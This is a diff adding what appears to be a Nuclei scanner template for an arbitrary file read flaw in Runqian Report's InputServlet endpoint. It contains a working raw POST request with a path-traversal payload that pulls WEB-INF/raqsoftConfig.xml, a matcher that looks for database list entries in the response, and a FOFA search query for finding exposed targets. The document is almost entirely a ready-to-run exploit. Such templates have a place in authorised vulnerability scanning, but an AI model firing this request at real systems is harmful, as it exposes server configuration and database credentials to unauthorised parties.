@@ -1,0 +1,26 @@
+id: rqbb-fileupload-InputServlet
+
+info:
+  name: 润乾报表-任意文件读取-InputServlet
+  author: HuanXiong
+  severity: high
+  metadata: 
+    fofa-query: title="润乾报表" || body="润乾报表"
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /InputServlet?action=13 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        
+        file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"DBList")
